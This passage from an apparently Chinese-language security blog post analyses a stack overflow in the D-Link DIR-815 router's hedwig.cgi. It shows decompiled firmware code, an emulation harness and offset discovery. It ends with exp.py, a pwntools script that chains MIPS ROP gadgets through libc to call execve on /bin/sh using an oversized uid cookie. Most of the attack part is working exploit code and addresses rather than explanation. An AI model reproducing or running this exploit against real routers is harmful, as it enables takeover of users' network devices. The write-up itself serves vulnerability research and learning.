&#125;</span><br><span class="line">  sess_get_uid(v4);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(v27, <span class="string">"%s/%s/postxml"</span>, <span class="string">"/runtime/session"</span>, v6);</span><br><span class="line">  xmldbc_del(<span class="number">0</span>, <span class="number">0</span>, v27);</span><br><span class="line">  v7 = fopen(<span class="string">"/var/tmp/temp.xml"</span>, <span class="string">"w"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unable to open temp file."</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"no xml data."</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = fileno(v7);</span><br><span class="line">  v9 = lockf(v8, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">"HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;"</span>,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = fileno(v7);</span><br><span class="line">  lockf(v10, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  v23 = v26;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v24 = strtok(v22, <span class="string">"/"</span>);</span><br><span class="line">  v11 = (<span class="keyword">char</span> **)v25;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = strtok(<span class="number">0</span>, <span class="string">"/"</span>);</span><br><span class="line">    *v11++ = v13;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;v23)[i] = (<span class="keyword">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"</span>, v7);</span><br><span class="line">  v14 = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;v23;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v15;</span><br><span class="line">    <span class="built_in">fprintf</span>(v7, <span class="string">"&lt;%s&gt;\n"</span>, *v14++);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; i + <span class="number">1</span> );</span><br><span class="line">  v16 = <span class="built_in">strstr</span>(haystack, <span class="string">"&lt;postxml&gt;"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(v7, <span class="string">"%s\n"</span>, v16);</span><br><span class="line">  v17 = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;(&amp;v23)[i];</span><br><span class="line">  v18 = i + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v18;</span><br><span class="line">    <span class="built_in">fprintf</span>(v7, <span class="string">"&lt;/%s&gt;\n"</span>, *v17--);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18 &gt; <span class="number">0</span> );</span><br><span class="line">  fflush(v7);</span><br><span class="line">  xmldbc_read(<span class="number">0</span>, <span class="number">2</span>, <span class="string">"/var/tmp/temp.xml"</span>);</span><br><span class="line">  v19 = fileno(v7);</span><br><span class="line">  lockf(v19, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  fclose(v7);</span><br><span class="line">  remove(<span class="string">"/var/tmp/temp.xml"</span>);</span><br><span class="line">  v20 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(v27, <span class="string">"/htdocs/webinc/fatlady.php\nprefix=%s/%s"</span>, <span class="string">"/runtime/session"</span>, v20);</span><br><span class="line">  xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v27, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">"HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;"</span>,</span><br><span class="line">      v1);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sess_get_uid</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// $s4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v2 = sobj_new();</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  v3 = getenv(<span class="string">"HTTP_COOKIE"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">32</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(v2);</span><br><span class="line">      sobj_free(v4);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">59</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="number">61</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v2, v7);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">59</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v4, *v5++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">"uid"</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">"uid"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    v8 = sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  v8 = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  result = sobj_add_string(a1, v8);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = sobj_del(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    result = sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>sprintf函数以零字节为截断符，cgibin的代码段地址为0x0040xxxx，高位必然存在零字节截断，因而无法通过代码段构造rop，这里模拟真机环境下的无地址随机化，使用用户态的qemu-mipsel-static启动固件。假如可以拿到真机，开放ssh服务，通过gdbserver+gdb即可调试真机，cgibin的固件地址可以通过gdb调试得到(系统关闭随机化)。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line">PORT=<span class="string">"1234"</span></span><br><span class="line"><span class="built_in">test</span>=$(python -c <span class="string">"print 'uid='+open('test','r').read(2000)"</span>)</span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$test</span>"</span> | wc -c)</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD=<span class="string">"POST"</span> -E HTTP_COOKIE=<span class="variable">$test</span> -E REQUEST_URL=<span class="string">"/hedwig.cgi"</span> -E REMOTE_ADDR=<span class="string">"127.0.0.1"</span> -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi 2&gt;/dev/null rm -f ./qemu</span><br></pre></td></tr></table></figure>
+<p>首先需要确定溢出的偏移，在gdb调试到sprintf时使用<code>cyclic 2000</code>生成payload，<code>set {char [2002]} 0x42e0d8 = &quot;&quot;</code>将目标地址的内容强制修改为cyclic字符串，最后使用<code>cyclic -l 61616c6b</code>确定偏移为1043.</p>
+<p><img src="/2020/12/19/D-LINK-DIR815-stack-overflow/1.png" alt=""></p>
+<p>观察函数退出时的汇编，可以控制s0-s7,fp和ra。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A28                 lw      $ra, 0x4E4($sp)</span><br><span class="line">.text:00409A2C                 move    $v0, $s7</span><br><span class="line">.text:00409A30                 lw      $fp, 0x4E0($sp)</span><br><span class="line">.text:00409A34                 lw      $s7, 0x4DC($sp)</span><br><span class="line">.text:00409A38                 lw      $s6, 0x4D8($sp)</span><br><span class="line">.text:00409A3C                 lw      $s5, 0x4D4($sp)</span><br><span class="line">.text:00409A40                 lw      $s4, 0x4D0($sp)</span><br><span class="line">.text:00409A44                 lw      $s3, 0x4CC($sp)</span><br><span class="line">.text:00409A48                 lw      $s2, 0x4C8($sp)</span><br><span class="line">.text:00409A4C                 lw      $s1, 0x4C4($sp)</span><br><span class="line">.text:00409A50                 lw      $s0, 0x4C0($sp)</span><br><span class="line">.text:00409A54                 jr      $ra</span><br></pre></td></tr></table></figure>
+<p>寻找可控参数寄存器<code>a0/a1/a2</code>的寄存器，找到<code>#0x00022760 : move $t9, $s1 ; move $a0, $s5 ; move $a1, $zero ; move $a2, $zero ; jalr $t9 ; move $a3, $s6</code>这样一个完美的gadget，由于system函数末尾为零字节，改为调用execve函数。system函数会启动一个新进程，保留旧进程；而execve函数拿bash进程替换原进程。</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'mips'</span></span><br><span class="line">context.endian =  <span class="string">'little'</span></span><br><span class="line"><span class="comment">#0x0040dc14 : move $a0, $s3 ; jalr $t9 ; move $a1, $s0</span></span><br><span class="line">mov_a0_s3 = <span class="number">0x0040dc14</span></span><br><span class="line"><span class="comment">#0x00404d6c : move $t9, $v1 ; jalr $t9 ; move $a0, $s3</span></span><br><span class="line">mov_t9_v1 = <span class="number">0x00404d6c</span></span><br><span class="line"><span class="comment">#0x00402F84 :lw $a0, 0x4E4($sp) ; lw $t9, 0x4E0($sp) ; jalr    $t9 ;</span></span><br><span class="line"><span class="comment">#0x00046838 : move $t9, $s2 ; move $a0, $s1 ; move $a1, $s7 ; move $a2, $s6 ; move $t9, $s3 ; jalr $t9 ; move $a3, $s5</span></span><br><span class="line">libc_base = <span class="number">0x7f738000</span></span><br><span class="line">magic = libc_base + <span class="number">0x46838</span></span><br><span class="line"><span class="comment">#0x0003a738 : move $a1, $zero ; move $t9, $s0 ; jalr $t9 ; move $a2, $s2</span></span><br><span class="line">magic2 = libc_base + <span class="number">0x3a738</span></span><br><span class="line"><span class="comment">#0x00032198 : move $s0, $zero ; move $t9, $s7 ; jalr $t9 ; move $a0, $s4</span></span><br><span class="line">magic3 = libc_base + <span class="number">0x32198</span></span><br><span class="line"><span class="comment">#0x00028398 : move $a2, $s0 ; move $a1, $s1 ; move $t9, $s3 ; jalr $t9 ; move $a0, $s2</span></span><br><span class="line">magic4 = libc_base + <span class="number">0x28398</span></span><br><span class="line"><span class="comment">#0x00022760 : move $t9, $s1 ; move $a0, $s5 ; move $a1, $zero ; move $a2, $zero ; jalr $t9 ; move $a3, $s6</span></span><br><span class="line">magic5 = libc_base + <span class="number">0x00022760</span></span><br><span class="line">system = <span class="number">0x7f78b200</span><span class="number">-1</span></span><br><span class="line">execv = <span class="number">0x7f78d650</span></span><br><span class="line">execve = <span class="number">0x7f742e90</span></span><br><span class="line">binsh = <span class="number">0x7f792448</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"xmzyshypnc"</span></span><br><span class="line">payload = payload.ljust(<span class="number">1043</span><span class="number">-4</span>*<span class="number">9</span>,<span class="string">b'b'</span>)</span><br><span class="line"><span class="comment">#payload = bytes(payload,encoding="gb2312")</span></span><br><span class="line">payload += p32(magic)  <span class="comment">#s0</span></span><br><span class="line">payload += p32(execve)  <span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">b"aaaa"</span>   <span class="comment">#s2</span></span><br><span class="line">payload += p32(magic2)   <span class="comment">#s3</span></span><br><span class="line">payload += <span class="string">b"aaaa"</span>   <span class="comment">#s4</span></span><br><span class="line">payload += p32(binsh)   <span class="comment">#s5</span></span><br><span class="line">payload += <span class="string">b"a2a2"</span>   <span class="comment">#s6</span></span><br><span class="line">payload += <span class="string">b"a1a1"</span>   <span class="comment">#s7</span></span><br><span class="line">payload += p32(magic4)    <span class="comment">#fp</span></span><br><span class="line">payload += p32(magic5)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'test'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/19/D-LINK-DIR815-stack-overflow/2.png" alt=""></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/14/CVE-2020-27194/" rel="next" title="CVE-2020-27194">
+                <i class="fa fa-chevron-left"></i> CVE-2020-27194
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="ama2in9" />
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">70</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#D-LINK-DIR815栈溢出分析"><span class="nav-number">1.</span> <span class="nav-text">D-LINK-DIR815栈溢出分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-py"><span class="nav-number">1.4.</span> <span class="nav-text">exp.py</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/';
